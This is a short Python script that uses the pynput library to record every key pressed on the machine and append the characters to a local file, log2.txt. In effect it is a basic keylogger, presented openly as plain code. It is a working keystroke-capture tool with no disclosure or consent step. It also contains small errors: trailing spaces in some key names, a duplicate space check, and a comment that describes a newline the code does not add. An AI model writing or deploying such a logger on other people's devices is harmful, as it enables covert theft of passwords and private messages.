from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space' :
        letter = ' '
    if letter == 'Key.backspace':
        letter = ''
    if letter == 'Key.delete':
        letter = ''
    if letter == 'Key.down':
        letter = ''
    if letter == 'Key.enter':
        letter = ''
    if letter == 'Key.esc':
        letter = ''
    if letter == 'Key.menu':
        letter = ''
    if letter == 'Key.shift_r ':
        letter = ''
    if letter == 'Key.up':
        letter = ''
    if letter == 'Key.space':
        letter = ''
    if letter == 'Key.tab ':
        letter = ''
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.shift_l':
        letter = ''
    if letter == 'Key.num_lock':
        letter = ''
    if letter == 'Key.alt':
        letter = ''
    if letter == 'Key.alt_gr':
        letter = ''
    if letter == 'Key.alt_l':
        letter = ''
    if letter == 'Key.alt_r':
        letter = ''
    if letter == 'Key.caps_lock':
        letter = ''
    if letter == 'Key.ctrl':
        letter = ''
    with open("log2.txt", 'a') as f:
        f.write(letter)  # Added newline character to separate each key press

with Listener(on_press=write_to_file) as l:
    l.join()